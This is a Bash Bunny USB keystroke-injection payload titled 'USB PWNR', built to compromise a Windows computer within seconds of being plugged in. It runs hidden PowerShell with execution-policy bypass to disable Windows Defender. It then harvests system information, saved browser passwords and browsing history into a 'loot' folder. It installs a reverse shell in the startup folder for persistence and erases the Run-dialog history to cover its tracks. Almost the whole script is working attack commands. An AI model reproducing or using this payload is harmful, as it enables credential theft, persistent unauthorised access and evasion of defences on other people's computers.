#USB PWNR
#P0WNS a computer in seconds

#Setup
LED SETUP
ATTACKMODE HID STORAGE
GET SWITCH_POSITION
#Wait for the computer to recognise the drive etc
QUACK delay 10000
#Disable AntiVirus (Windows Defender)
RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\disable-anti-virus.ps1')"
Q DELAY 2000
Q LEFT
Q ENTER
#Get drive letter and copying it:
RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\GetDrive.ps1')"
Q DELAY 2000

#InfoGrabber
LED STAGE1
RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\run.ps1')"
DELAY 1000

#BPG (BrowserPasswordGrabber)
LED STAGE2
RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\pass.exe')"
Q DELAY 3000
Q CONTROL a
Q DELAY 1000
Q CONTROL s
Q DELAY 1000
Q STRING %computername% - Pass
Q F4
Q DELAY 500
Q CONTROL a
Q DELAY 500
Q CONTROL v
Q DELAY 500
Q STRING loot
Q DELAY 500
Q ENTER
Q DELAY 1000
Q TAB
Q TAB
Q TAB
Q TAB
Q TAB
Q TAB
Q ENTER
Q DELAY 500
Q ALT F4

#BHG (BrowserHistoryGrabber)
LED STAGE 3
RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\history.exe')"
Q DELAY 5000
Q ENTER
Q DELAY 5000
Q CONTROL a
Q DELAY 1000
Q CONTROL s
Q DELAY 1000
Q STRING %computername% - History
Q F4
Q DELAY 500
Q CONTROL a
Q DELAY 500
Q CONTROL v
Q DELAY 500
Q STRING loot
Q DELAY 500
Q ENTER
Q DELAY 1000
Q TAB
Q TAB
Q TAB
Q TAB
Q TAB
Q TAB
Q ENTER
Q DELAY 500
Q ALT F4

#Copy reverse shell file to shell:startup and start it

LED STAGE4
QUACK $SWITCH_POSITION/copy-reverse.txt

#Cleaning up fase
LED CLEANUP
QUACK GUI r
QUACK DELAY 1000
QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
QUACK ENTER

LED FINISH
#ATTACKMODE OFF
